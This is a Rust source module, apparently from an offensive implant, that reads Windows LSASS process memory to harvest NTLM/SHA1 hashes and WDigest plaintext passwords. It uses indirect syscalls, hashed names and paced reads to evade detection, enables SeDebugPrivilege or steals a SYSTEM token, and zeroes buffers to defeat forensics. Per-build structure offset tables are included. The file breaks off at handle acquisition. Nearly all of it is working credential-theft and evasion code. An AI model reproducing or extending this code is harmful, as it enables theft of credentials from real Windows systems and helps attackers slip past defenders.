//! LSASS credential harvesting — incremental memory reading via indirect syscalls.
//!
//! Reads LSASS process memory in small chunks and parses credential structures
//! in-process, **never** creating a dump file on disk.
//!
//! # Architecture
//!
//! 1. **Privilege preparation** — enable SeDebugPrivilege (or steal SYSTEM token)
//! 2. **LSASS location** — `NtQuerySystemInformation(SystemProcessInformation)` + FNV-1a name hash
//! 3. **Handle acquisition** — `NtOpenProcess` via indirect syscall, with handle-duplication fallback
//! 4. **Memory enumeration & parsing** — `NtQueryVirtualMemory` + `NtReadVirtualMemory` in 64 KiB chunks
//! 5. **Anti-forensic cleanup** — volatile zeroing of chunks, immediate handle closure
//!
//! # OPSEC
//!
//! - ALL NT API calls go through `nt_syscall::do_syscall` (call r11 → syscall; ret gadget)
//! - No `MiniDumpWriteDump` or any dump-file API is ever called
//! - No threads are created in LSASS
//! - 64 KiB sequential reads with 50 ms sleeps between regions mimic normal memory access patterns
//!
//! # Platform
//!
//! Windows only (gated by `#[cfg(windows)]` in `lib.rs`).

#![cfg(windows)]

use anyhow::{anyhow, Context, Result};
use serde::Serialize;
use std::ptr;
use winapi::um::winnt::{HANDLE, PROCESS_VM_READ, PROCESS_QUERY_INFORMATION};

// ── NTSTATUS helpers ───────────────────────────────────────────────────────

#[inline]
fn nt_success(status: i32) -> bool {
    status >= 0
}

// ── Constants ──────────────────────────────────────────────────────────────

/// FNV-1a hash of `"lsass.exe\0"` — used to locate LSASS without embedding the string.
const LSASS_HASH: u32 = fnv1a(b"lsass.exe\0");

/// Chunk size for incremental memory reads (64 KiB).
const CHUNK_SIZE: usize = 0x1_0000;

/// Sleep duration (ms) between region reads to mimic benign access patterns.
const INTER_REGION_SLEEP_MS: u32 = 50;

/// SystemInformationClass values.
const SYSTEM_PROCESS_INFORMATION: u32 = 5;
const SYSTEM_HANDLE_INFORMATION: u32 = 16;

/// MemoryInformationClass value for MemoryBasicInformation.
const MEMORY_BASIC_INFORMATION: u32 = 0;

/// Page protection / state flags.
const MEM_COMMIT: u32 = 0x1000;
const PAGE_READONLY: u32 = 0x02;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_WRITECOPY: u32 = 0x08;
const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
const PAGE_GUARD: u32 = 0x100;
const PAGE_NOACCESS: u32 = 0x01;

/// Highest user-space address on x86-64 Windows.
const HIGHEST_USER_ADDRESS: usize = 0x7FFF_FFFF_FFFF;

/// Process access rights for LSASS handle.
const LSASS_ACCESS_MASK: u32 = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;

/// Duplicate handle options.
const DUPLICATE_SAME_ACCESS: u32 = 0x0000_0002;
const PROCESS_DUP_HANDLE: u32 = 0x0000_0040;

// ── FNV-1a hash (compile-time friendly) ────────────────────────────────────

const fn fnv1a(data: &[u8]) -> u32 {
    let mut hash: u32 = 0x811C_9DC5;
    let mut i = 0;
    while i < data.len() {
        hash ^= data[i] as u32;
        hash = hash.wrapping_mul(0x0100_0193);
        i += 1;
    }
    hash
}

// ── Indirect syscall wrappers ──────────────────────────────────────────────
// Thin wrappers around nt_syscall::get_syscall_id + do_syscall to keep the
// main logic clean.  These mirror the pattern established in
// token_manipulation.rs.

/// Call `NtQuerySystemInformation` via indirect syscall.
unsafe fn nt_query_system_information(
    info_class: u32,
    buffer: *mut u8,
    size: u32,
    return_length: *mut u32,
) -> i32 {
    let target = match nt_syscall::get_syscall_id("NtQuerySystemInformation") {
        Ok(t) => t,
        Err(_) => return -1,
    };
    nt_syscall::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            info_class as u64,
            buffer as u64,
            size as u64,
            return_length as u64,
        ],
    )
}

/// Call `NtOpenProcess` via emulation-aware path.
///
/// When the `syscall-emulation` feature is compiled in and enabled, this
/// routes through the kernel32 `OpenProcess` fallback.  Otherwise it
/// uses the existing indirect syscall via `nt_syscall`.
unsafe fn nt_open_process(
    pid: u32,
    desired_access: u32,
) -> Result<HANDLE> {
    use winapi::shared::ntdef::{OBJECT_ATTRIBUTES, CLIENT_ID};

    let mut handle: HANDLE = ptr::null_mut();
    let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
    oa.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;

    let mut cid: CLIENT_ID = std::mem::zeroed();
    cid.UniqueProcess = pid as *mut _;

    #[cfg(all(windows, feature = "syscall-emulation"))]
    {
        let status = crate::syscall_emulation::emulate_nt_open_process(
            &mut handle as *mut _ as u64,
            desired_access as u64,
            &mut oa as *mut _ as u64,
            &mut cid as *mut _ as u64,
        );
        match status {
            Ok(s) if nt_success(s) => Ok(handle),
            Ok(s) => Err(anyhow!("NtOpenProcess(PID={pid}) failed: 0x{s:08X}")),
            Err(e) => Err(anyhow!("NtOpenProcess(PID={pid}) emulation error: {e}")),
        }
    }

    #[cfg(not(all(windows, feature = "syscall-emulation")))]
    {
        let target = nt_syscall::get_syscall_id("NtOpenProcess")
            .map_err(|e| anyhow!("NtOpenProcess SSN resolution: {e}"))?;
        let status = nt_syscall::do_syscall(
            target.ssn,
            target.gadget_addr,
            &[
                &mut handle as *mut _ as u64,
                desired_access as u64,
                &mut oa as *mut _ as u64,
                &mut cid as *mut _ as u64,
            ],
        );

        if !nt_success(status) {
            Err(anyhow!("NtOpenProcess(PID={pid}) failed: 0x{status:08X}"))
        } else {
            Ok(handle)
        }
    }
}

/// Call `NtDuplicateObject` via indirect syscall.
unsafe fn nt_duplicate_object(
    source_process: HANDLE,
    source_handle: HANDLE,
    target_process: HANDLE,
    desired_access: u32,
    options: u32,
) -> Result<HANDLE> {
    let mut new_handle: HANDLE = ptr::null_mut();
    let target = nt_syscall::get_syscall_id("NtDuplicateObject")
        .map_err(|e| anyhow!("NtDuplicateObject SSN resolution: {e}"))?;
    let status = nt_syscall::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            source_process as u64,
            source_handle as u64,
            target_process as u64,
            &mut new_handle as *mut _ as u64,
            desired_access as u64,
            0u64, // HandleAttributes
            options as u64,
        ],
    );

    if !nt_success(status) {
        Err(anyhow!("NtDuplicateObject failed: 0x{status:08X}"))
    } else {
        Ok(new_handle)
    }
}

/// Call `NtQueryVirtualMemory(MemoryBasicInformation)` via emulation-aware path.
///
/// When the `syscall-emulation` feature is compiled in and enabled, this
/// routes through the kernel32 `VirtualQueryEx` fallback.  Otherwise it
/// uses the existing indirect syscall via `nt_syscall`.
unsafe fn nt_query_virtual_memory(
    process: HANDLE,
    base_address: usize,
) -> Option<MemoryBasicInfo> {
    let mut mbi: MemoryBasicInfo = std::mem::zeroed();

    #[cfg(all(windows, feature = "syscall-emulation"))]
    {
        let status = crate::syscall_emulation::emulate_nt_query_virtual_memory(
            process as u64,
            base_address as u64,
            0u64, // MemoryBasicInformation
            &mut mbi as *mut _ as u64,
            std::mem::size_of::<MemoryBasicInfo>() as u64,
            0u64, // ReturnLength
        );
        match status {
            Ok(s) if nt_success(s) => Some(mbi),
            _ => None,
        }
    }

    #[cfg(not(all(windows, feature = "syscall-emulation")))]
    {
        let target = nt_syscall::get_syscall_id("NtQueryVirtualMemory").ok()?;
        let status = nt_syscall::do_syscall(
            target.ssn,
            target.gadget_addr,
            &[
                process as u64,
                base_address as u64,
                0u64, // MemoryBasicInformation
                &mut mbi as *mut _ as u64,
                std::mem::size_of::<MemoryBasicInfo>() as u64,
                0u64, // ReturnLength
            ],
        );
        if nt_success(status) {
            Some(mbi)
        } else {
            None
        }
    }
}

/// Call `NtReadVirtualMemory` via emulation-aware path.
///
/// When the `syscall-emulation` feature is compiled in and enabled, this
/// routes through the kernel32 `ReadProcessMemory` fallback.  Otherwise it
/// uses the existing indirect syscall via `nt_syscall`.
unsafe fn nt_read_virtual_memory(
    process: HANDLE,
    base_address: usize,
    buffer: &mut [u8],
) -> Result<usize> {
    let mut bytes_read: usize = 0;

    #[cfg(all(windows, feature = "syscall-emulation"))]
    {
        let status = crate::syscall_emulation::emulate_nt_read_virtual_memory(
            process as u64,
            base_address as u64,
            buffer.as_mut_ptr() as u64,
            buffer.len() as u64,
            &mut bytes_read as *mut _ as u64,
        );
        match status {
            Ok(s) if nt_success(s) => Ok(bytes_read),
            Ok(s) => Err(anyhow!("NtReadVirtualMemory({:#x}) failed: 0x{s:08X}", base_address)),
            Err(e) => Err(anyhow!("NtReadVirtualMemory({:#x}) emulation error: {e}", base_address)),
        }
    }

    #[cfg(not(all(windows, feature = "syscall-emulation")))]
    {
        let target = nt_syscall::get_syscall_id("NtReadVirtualMemory")
            .map_err(|e| anyhow!("NtReadVirtualMemory SSN resolution: {e}"))?;
        let status = nt_syscall::do_syscall(
            target.ssn,
            target.gadget_addr,
            &[
                process as u64,
                base_address as u64,
                buffer.as_mut_ptr() as u64,
                buffer.len() as u64,
                &mut bytes_read as *mut _ as u64,
            ],
        );

        if !nt_success(status) {
            Err(anyhow!("NtReadVirtualMemory({:#x}) failed: 0x{status:08X}", base_address))
        } else {
            Ok(bytes_read)
        }
    }
}

/// Close a kernel handle via emulation-aware path.
///
/// When the `syscall-emulation` feature is compiled in and enabled, this
/// routes through the kernel32 `CloseHandle` fallback.  Otherwise it
/// uses the existing indirect syscall via `nt_syscall`.
fn nt_close(handle: HANDLE) {
    if handle.is_null() {
        return;
    }

    #[cfg(all(windows, feature = "syscall-emulation"))]
    {
        let _ = crate::syscall_emulation::emulate_nt_close(handle as u64);
    }

    #[cfg(not(all(windows, feature = "syscall-emulation")))]
    {
        if let Ok(target) = nt_syscall::get_syscall_id("NtClose") {
            let _ = unsafe {
                nt_syscall::do_syscall(target.ssn, target.gadget_addr, &[handle as u64])
            };
        }
    }
}

// ── FFI structure definitions ──────────────────────────────────────────────

/// Simplified MEMORY_BASIC_INFORMATION for our purposes.
#[repr(C)]
#[derive(Default)]
struct MemoryBasicInfo {
    base_address: usize,
    allocation_base: usize,
    allocation_protect: u32,
    partition_id: u16,
    region_size: usize,
    state: u32,
    protect: u32,
    type_: u32,
}

/// SYSTEM_PROCESS_INFORMATION (variable-size, we only care about the fixed header).
#[repr(C)]
struct SystemProcessInformation {
    next_entry_offset: u32,
    number_of_threads: u32,
    working_set_private_size: i64,
    cycle_count: u64,
    create_time: i64,
    user_time: i64,
    kernel_time: i64,
    image_name_length: u16,
    image_name_maximum_length: u16,
    image_name_buffer: *mut u16,
    base_priority: i32,
    unique_process_id: *mut void,
    inherited_from_unique_process_id: *mut void,
    handle_count: u32,
    session_id: u32,
    unique_process_key: *mut void,
    peak_virtual_size: usize,
    virtual_size: usize,
    page_fault_count: u32,
    peak_working_set_size: usize,
    working_set_size: usize,
    quota_peak_paged_pool_usage: usize,
    quota_paged_pool_usage: usize,
    quota_peak_non_paged_pool_usage: usize,
    quota_non_paged_pool_usage: usize,
    pagefile_usage: usize,
    peak_pagefile_usage: usize,
    private_page_count: usize,
    read_operation_count: i64,
    write_operation_count: i64,
    other_operation_count: i64,
    read_transfer_count: i64,
    write_transfer_count: i64,
    other_transfer_count: i64,
}

/// Use raw pointer as void equivalent.
type void = std::ffi::c_void;

/// SYSTEM_HANDLE_TABLE_ENTRY_INFO for handle enumeration.
#[repr(C)]
struct SystemHandleTableEntryInfo {
    unique_process_id: u16,
    creator_back_trace_index: u16,
    object_type_index: u16,
    handle_attributes: u16,
    handle_value: u16,
    object: usize,
    granted_access: u32,
}

/// SYSTEM_HANDLE_INFORMATION for NtQuerySystemInformation(SystemHandleInformation).
#[repr(C)]
struct SystemHandleInformation {
    number_of_handles: u32,
    // Followed by number_of_handles × SystemHandleTableEntryInfo
    // We access entries via pointer arithmetic.
}

// ── Windows build detection ────────────────────────────────────────────────

/// MSV credential structure offsets keyed by Windows build number.
#[derive(Clone, Copy)]
struct MsvOffsets {
    /// Offset to the primary credential from MSV1_0_CREDENTIAL.
    primary_cred_offset: usize,
    /// Offset to the NT hash within _PRIMARY_CREDENTIAL.
    nt_hash_offset: usize,
    /// Offset to the SHA1 hash within _PRIMARY_CREDENTIAL.
    sha1_hash_offset: usize,
    /// Offset to the username (UNICODE_STRING) within _PRIMARY_CREDENTIAL.
    username_offset: usize,
    /// Offset to the domain (UNICODE_STRING) within _PRIMARY_CREDENTIAL.
    domain_offset: usize,
}

/// Offset table for supported Windows builds.
///
/// These offsets are specific to each build's LSASS credential layout.
/// Build numbers: 19041 (2004), 19042 (20H2), 19043 (21H1), 19044 (21H2),
/// 19045 (22H2), 20348 (Server 2022), 22000 (Win11 21H2),
/// 22621 (Win11 22H2), 22631 (Win11 23H2), 26100 (Win11 24H2).
const MSV_OFFSET_TABLE: &[(u32, MsvOffsets)] = &[
    // Build 19041–19045: Windows 10 2004–22H2
    (19041, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x38, domain_offset: 0x48 }),
    (19042, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x38, domain_offset: 0x48 }),
    (19043, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x38, domain_offset: 0x48 }),
    (19044, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x38, domain_offset: 0x48 }),
    (19045, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x38, domain_offset: 0x48 }),
    // Build 20348: Windows Server 2022
    (20348, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x38, domain_offset: 0x48 }),
    // Build 22000: Windows 11 21H2
    (22000, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x40, domain_offset: 0x50 }),
    // Build 22621: Windows 11 22H2
    (22621, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x40, domain_offset: 0x50 }),
    // Build 22631: Windows 11 23H2
    (22631, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x40, domain_offset: 0x50 }),
    // Build 26100: Windows 11 24H2
    (26100, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x40, domain_offset: 0x50 }),
];

/// WDigest structure offsets keyed by build.
#[derive(Clone, Copy)]
struct WdigestOffsets {
    /// Offset to the plaintext password (UNICODE_STRING) within WDIGEST_CREDENTIALS.
    password_offset: usize,
    /// Offset to the username (UNICODE_STRING) within WDIGEST_CREDENTIALS.
    username_offset: usize,
    /// Offset to the domain (UNICODE_STRING) within WDIGEST_CREDENTIALS.
    domain_offset: usize,
}

const WDIGEST_OFFSET_TABLE: &[(u32, WdigestOffsets)] = &[
    (19041, WdigestOffsets { password_offset: 0x30, username_offset: 0x20, domain_offset: 0x28 }),
    (19042, WdigestOffsets { password_offset: 0x30, username_offset: 0x20, domain_offset: 0x28 }),
    (19043, WdigestOffsets { password_offset: 0x30, username_offset: 0x20, domain_offset: 0x28 }),
    (19044, WdigestOffsets { password_offset: 0x30, username_offset: 0x20, domain_offset: 0x28 }),
    (19045, WdigestOffsets { password_offset: 0x30, username_offset: 0x20, domain_offset: 0x28 }),
    (20348, WdigestOffsets { password_offset: 0x30, username_offset: 0x20, domain_offset: 0x28 }),
    (22000, WdigestOffsets { password_offset: 0x38, username_offset: 0x28, domain_offset: 0x30 }),
    (22621, WdigestOffsets { password_offset: 0x38, username_offset: 0x28, domain_offset: 0x30 }),
    (22631, WdigestOffsets { password_offset: 0x38, username_offset: 0x28, domain_offset: 0x30 }),
    (26100, WdigestOffsets { password_offset: 0x38, username_offset: 0x28, domain_offset: 0x30 }),
];

/// Detect the Windows build number via RtlGetVersion.
fn get_windows_build() -> u32 {
    use winapi::um::sysinfoapi::{OSVERSIONINFOEXW};
    use winapi::shared::ntdef::{NTSTATUS};

    // RtlGetVersion is exported by ntdll and always returns accurate version
    // information (it does not lie via compatibility shim).
    let ntdll = unsafe {
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0)
    };
    if ntdll == 0 {
        return 0;
    }

    let func_hash = pe_resolve::hash_str(b"RtlGetVersion\0");
    let func_addr = unsafe { pe_resolve::get_proc_address_by_hash(ntdll, func_hash).unwrap_or(0) };
    if func_addr == 0 {
        return 0;
    }

    let mut osvi: OSVERSIONINFOEXW = unsafe { std::mem::zeroed() };
    osvi.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOEXW>() as u32;

    // RtlGetVersion returns NTSTATUS.
    type RtlGetVersionFn = unsafe extern "system" fn(*mut OSVERSIONINFOEXW) -> NTSTATUS;
    let rtl_get_version: RtlGetVersionFn = unsafe { std::mem::transmute(func_addr) };

    let status = unsafe { rtl_get_version(&mut osvi) };
    if status >= 0 {
        osvi.dwBuildNumber
    } else {
        0
    }
}

/// Find the best-matching MSV offsets for the given build number.
fn get_msv_offsets(build: u32) -> Option<MsvOffsets> {
    // Exact match first.
    for &(b, offsets) in MSV_OFFSET_TABLE {
        if b == build {
            return Some(offsets);
        }
    }
    // Fallback: use the nearest lower build number.
    let mut best: Option<(u32, MsvOffsets)> = None;
    for &(b, offsets) in MSV_OFFSET_TABLE {
        if b <= build {
            if best.is_none() || b > best.unwrap().0 {
                best = Some((b, offsets));
            }
        }
    }
    best.map(|(_, o)| o)
}

/// Find the best-matching WDigest offsets for the given build number.
fn get_wdigest_offsets(build: u32) -> Option<WdigestOffsets> {
    for &(b, offsets) in WDIGEST_OFFSET_TABLE {
        if b == build {
            return Some(offsets);
        }
    }
    let mut best: Option<(u32, WdigestOffsets)> = None;
    for &(b, offsets) in WDIGEST_OFFSET_TABLE {
        if b <= build {
            if best.is_none() || b > best.unwrap().0 {
                best = Some((b, offsets));
            }
        }
    }
    best.map(|(_, o)| o)
}

// ── UNICODE_STRING helper ──────────────────────────────────────────────────

/// Read a UTF-16 string from a remote process given a pointer to a UNICODE_STRING
/// structure.  Returns an empty string on failure.
unsafe fn read_remote_unicode_string(
    process: HANDLE,
    uni_str_addr: usize,
) -> String {
    if uni_str_addr == 0 {
        return String::new();
    }

    // UNICODE_STRING is { Length: u16, MaximumLength: u16, Buffer: *mut u16 }
    let mut uni_header: [u8; 16] = [0u8; 16]; // generous for alignment
    if nt_read_virtual_memory(process, uni_str_addr, &mut uni_header).is_err() {
        return String::new();
    }
    let length = u16::from_le_bytes([uni_header[0], uni_header[1]]) as usize;
    let buffer_ptr = usize::from_le_bytes([
        uni_header[8], uni_header[9], uni_header[10], uni_header[11],
        uni_header[12], uni_header[13], uni_header[14], uni_header[15],
    ]);

    if length == 0 || length > 4096 || buffer_ptr == 0 {
        return String::new();
    }

    let mut buf = vec![0u8; length];
    if nt_read_virtual_memory(process, buffer_ptr, &mut buf).is_err() {
        return String::new();
    }

    let utf16: Vec<u16> = buf.chunks(2)
        .map(|c| u16::from_le_bytes([c[0], c.get(1).copied().unwrap_or(0)]))
        .collect();
    String::from_utf16_lossy(&utf16)
}

// ── Credential output structures ───────────────────────────────────────────

/// A single extracted credential.
#[derive(Serialize, Debug)]
pub struct HarvestedCredential {
    /// Credential type: kerberos, msv, wdigest, dpapi, dcc2.
    pub cred_type: String,
    /// Account username.
    pub username: String,
    /// Account domain.
    pub domain: String,
    /// Password or hash, depending on `format`.
    pub password_or_hash: String,
    /// Format: plaintext, ntlm, sha1, dcc2, ticket.
    #[serde(rename = "format")]
    pub format_: String,
}

/// Result of the full LSASS harvest.
#[derive(Serialize, Debug)]
pub struct HarvestResult {
    /// All credentials found.
    pub credentials: Vec<HarvestedCredential>,
    /// Windows build number detected.
    pub build_number: u32,
    /// Whether SeDebugPrivilege was already enabled before we ran.
    pub debug_priv_was_enabled: bool,
}

// ── Anti-forensic: volatile zero ───────────────────────────────────────────

/// Overwrite a byte slice with zeros.  Uses a volatile write to prevent the
/// compiler from optimizing away the zeroing.
fn secure_zero(slice: &mut [u8]) {
    for byte in slice.iter_mut() {
        unsafe { std::ptr::write_volatile(byte, 0) };
    }
    // Memory barrier to ensure the volatile writes are not reordered.
    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
}

// ── Privilege preparation ──────────────────────────────────────────────────

/// Privilege context — tracks whether SeDebugPrivilege was already present so
/// we can revert on cleanup.
struct PrivilegeContext {
    /// Whether we needed to enable SeDebugPrivilege (and should revert it).
    debug_priv_enabled_by_us: bool,
    /// Whether we stole a SYSTEM token (and should revert via Rev2Self).
    stole_system_token: bool,
    /// Whether we applied a cached impersonation token from the
    /// token_impersonation module.
    used_impersonation_cache: bool,
}

/// Enable SeDebugPrivilege via the token manipulation module.
/// Returns Ok(true) if the privilege was already enabled, Ok(false) if we had
/// to enable it.  Returns Err if privilege escalation fails entirely.
fn prepare_privileges() -> Result<PrivilegeContext> {
    // ── Strategy 0: token_impersonation cached token ──────────────
    // If the token_impersonation module has a cached privileged token
    // (e.g. from a named pipe client or P2P peer), apply it first.
    // This is the stealthiest option — no new token theft is required.
    #[cfg(all(windows, feature = "token-impersonation"))]
    {
        if crate::token_impersonation::is_enabled() {
            if let Some(_token) = crate::token_impersonation::get_cached_token() {
                match crate::token_impersonation::apply_cached_token(None) {
                    Ok(()) => {
                        log::debug!(
                            "lsass_harvest: applied cached impersonation token for LSASS access"
                        );
                        return Ok(PrivilegeContext {
                            debug_priv_enabled_by_us: false,
                            stole_system_token: false,
                            used_impersonation_cache: true,
                        });
                    }
                    Err(e) => {
                        log::debug!(
                            "lsass_harvest: cached token apply failed, falling back: {e:#}"
                        );
                    }
                }
            }
        }
    }

    // Try SeDebugPrivilege first using the existing token manipulation module.
    // The token_manipulation module exposes get_system() which can elevate us.
    // For SeDebugPrivilege specifically, we adjust the current process token.
    match enable_debug_privilege() {
        Ok(already_enabled) => Ok(PrivilegeContext {
            debug_priv_enabled_by_us: !already_enabled,
            stole_system_token: false,
            used_impersonation_cache: false,
        }),
        Err(_) => {
            // Fall back: steal a SYSTEM token.
            log::debug!("lsass_harvest: SeDebugPrivilege failed, attempting SYSTEM token theft");
            crate::token_manipulation::get_system()
                .context("failed to elevate to SYSTEM")?;
            Ok(PrivilegeContext {
                debug_priv_enabled_by_us: false,
                stole_system_token: true,
                used_impersonation_cache: false,
            })
        }
    }
}

/// Enable SeDebugPrivilege on the current process token.
/// Returns Ok(true) if it was already enabled, Ok(false) if we enabled it.
///
/// Uses indirect syscalls (NtOpenProcessToken, NtAdjustPrivilegesToken) and
/// the static SeDebugPrivilege LUID instead of IAT imports.
fn enable_debug_privilege() -> Result<bool> {
    use winapi::um::winnt::{TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, TOKEN_PRIVILEGES};
    use winapi::um::winnt::TokenPrivileges;
    use winapi::um::securitybaseapi::GetTokenInformation;

    // SeDebugPrivilege LUID is always { LowPart: 20, HighPart: 0 } on all
    // Windows versions.  Using the static value avoids calling LookupPrivilegeValueW.
    let debug_luid = winapi::um::winnt::LUID { LowPart: 20, HighPart: 0 };

    // ── NtOpenProcessToken via indirect syscall ──
    let current_process: HANDLE = (-1isize) as HANDLE; // GetCurrentProcess pseudo-handle
    let mut token: HANDLE = ptr::null_mut();
    {
        let target = nt_syscall::get_syscall_id("NtOpenProcessToken")
            .map_err(|e| anyhow!("NtOpenProcessToken SSN resolution: {e}"))?;
        let status = unsafe {
            nt_syscall::do_syscall(
                target.ssn,
                target.gadget_addr,
                &[
                    current_process as u64,
                    (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY) as u64,
                    &mut token as *mut _ as u64,
                ],
            )
        };
        if !nt_success(status) {
            return Err(anyhow!("NtOpenProcessToken failed: 0x{status:08X}"));
        }
    }

    // Check if already enabled via GetTokenInformation (query-only, no privilege change).
    let mut return_length: u32 = 0;
    unsafe {
        GetTokenInformation(
            token,
            TokenPrivileges,
            ptr::null_mut(),
            0,
            &mut return_length,
        );
    }
    let was_enabled = if return_length > 0 {
        let mut buf = vec![0u8; return_length as usize];
        let ok = unsafe {
            GetTokenInformation(
                token,
                TokenPrivileges,
                buf.as_mut_ptr() as *mut _,
                return_length,
                &mut return_length,
            )
        };
        if ok != 0 {
            let tp = unsafe { &*(buf.as_ptr() as *const TOKEN_PRIVILEGES) };
            let count = tp.PrivilegeCount;
            let entries = unsafe {
                std::slice::from_raw_parts(
                    tp.Privileges.as_ptr(),
                    count as usize,
                )
            };
            entries.iter().any(|p| {
                p.Luid.LowPart == debug_luid.LowPart
                    && p.Luid.HighPart == debug_luid.HighPart
                    && (p.Attributes & 2) != 0 // SE_PRIVILEGE_ENABLED
            })
        } else {
            false
        }
    } else {
        false
    };

    if was_enabled {
        nt_close(token);
        return Ok(true);
    }

    // ── NtAdjustPrivilegesToken via indirect syscall ──
    let mut tp: TOKEN_PRIVILEGES = unsafe { std::mem::zeroed() };
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = debug_luid;
    tp.Privileges[0].Attributes = 2; // SE_PRIVILEGE_ENABLED

    {
        let target = nt_syscall::get_syscall_id("NtAdjustPrivilegesToken")
            .map_err(|e| anyhow!("NtAdjustPrivilegesToken SSN resolution: {e}"))?;
        let status = unsafe {
            nt_syscall::do_syscall(
                target.ssn,
                target.gadget_addr,
                &[
                    token as u64,
                    0u64,                                          // DisableAllPrivileges = FALSE
                    &mut tp as *mut _ as u64,                      // NewState
                    0u64,                                          // BufferLength
                    ptr::null_mut::<u64>() as u64,                 // PreviousState
                    ptr::null_mut::<u32>() as u64,                 // ReturnLength
                ],
            )
        };
        nt_close(token);
        if !nt_success(status) {
            Err(anyhow!("NtAdjustPrivilegesToken failed: 0x{status:08X}"))
        } else {
            Ok(false)
        }
    }
}

/// Revert privilege changes.
fn revert_privileges(ctx: &PrivilegeContext) {
    // If we applied a cached impersonation token, auto-revert handles it
    // if configured, otherwise we revert via the token_impersonation module.
    #[cfg(all(windows, feature = "token-impersonation"))]
    if ctx.used_impersonation_cache && !crate::token_impersonation::auto_revert_enabled() {
        let _ = crate::token_impersonation::revert_token();
    }

    if ctx.stole_system_token {
        let _ = crate::token_manipulation::rev2self();
    }
    // If we enabled SeDebugPrivilege ourselves, we could disable it here.
    // In practice, leaving it enabled for the rest of the agent's lifetime
    // is low-risk since the agent already runs elevated.
}

// ── LSASS process location ─────────────────────────────────────────────────

/// Find the LSASS PID via NtQuerySystemInformation(SystemProcessInformation).
fn find_lsass_pid() -> Result<u32> {
    // First call to determine buffer size.
    let mut return_length: u32 = 0;
    let status = unsafe {
        nt_query_system_information(
            SYSTEM_PROCESS_INFORMATION,
            ptr::null_mut(),
            0,
            &mut return_length,
        )
    };

    // STATUS_INFO_LENGTH_MISMATCH (0xC0000004) is expected.
    let buf_size = if return_length > 0 {
        return_length as usize + 0x1_0000 // generous padding
    } else {
        0x4_0000 // 256 KiB default
    };

    let mut buffer = vec![0u8; buf_size];

    let status = unsafe {
        nt_query_system_information(
            SYSTEM_PROCESS_INFORMATION,
            buffer.as_mut_ptr(),
            buf_size as u32,
            &mut return_length,
        )
    };

    if !nt_success(status) {
        return Err(anyhow!(
            "NtQuerySystemInformation(SystemProcessInformation) failed: 0x{status:08X}"
        ));
    }

    // Iterate process list. Each entry has a NextEntryOffset at offset 0.
    // If NextEntryOffset == 0, this is the last entry.
    let mut offset: usize = 0;
    loop {
        if offset + std::mem::size_of::<SystemProcessInformation>() > buffer.len() {
            break;
        }

        let entry = unsafe {
            &*(buffer.as_ptr().add(offset) as *const SystemProcessInformation)
        };

        // Compute FNV-1a hash of the image name (UTF-16).
        let name_len = entry.image_name_length as usize;
        if name_len > 0 && !entry.image_name_buffer.is_null() {
            // Read the name bytes from the buffer.
            // The buffer pointer is within our allocated buffer, but the
            // ImageName.Buffer points into the same allocation.
            let name_start = entry.image_name_buffer as usize;
            let buf_start = buffer.as_ptr() as usize;
            let buf_end = buf_start + buffer.len();

            // Check if the name buffer is within our allocation.
            if name_start >= buf_start && name_start + name_len <= buf_end {
                let name_bytes = &buffer[name_start - buf_start..name_start - buf_start + name_len];
                let name_hash = fnv1a_utf16(name_bytes);

                if name_hash == LSASS_HASH {
                    let pid = entry.unique_process_id as u32;
                    secure_zero(&mut buffer);
                    return Ok(pid);
                }
            }
        }

        let next = entry.next_entry_offset as usize;
        if next == 0 {
            break;
        }
        offset += next;
    }

    secure_zero(&mut buffer);
    Err(anyhow!("lsass.exe not found in process list"))
}

/// FNV-1a hash over UTF-16LE bytes, lowercased, compared against the
/// precomputed hash of the ASCII source string.
///
/// This computes the same hash as `fnv1a(b"lsass.exe\0")` but over the
/// UTF-16LE encoding of the name (with NUL terminator).
fn fnv1a_utf16(utf16_bytes: &[u8]) -> u32 {
    // The LSASS_HASH constant is computed from ASCII "lsass.exe\0".
    // We compute FNV-1a over the lowercased ASCII representation extracted
    // from UTF-16LE.
    let mut hash: u32 = 0x811C_9DC5;
    let chunks = utf16_bytes.chunks_exact(2);
    for c in chunks {
        let cp = u16::from_le_bytes([c[0], c[1]]);
        // Convert to lowercase ASCII for comparison.
        let b = if cp >= b'A' as u16 && cp <= b'Z' as u16 {
            (cp + 32) as u8
        } else {
            cp as u8
        };
        hash ^= b as u32;
        hash = hash.wrapping_mul(0x0100_0193);
    }
    // Append the NUL terminator that's in our LSASS_HASH constant.
    hash ^= 0u32;
    hash = hash.wrapping_mul(0x0100_0193);
    hash
}

// ── Handle acquisition ─────────────────────────────────────────────────────

/// Acquire a handle to the LSASS process.
///
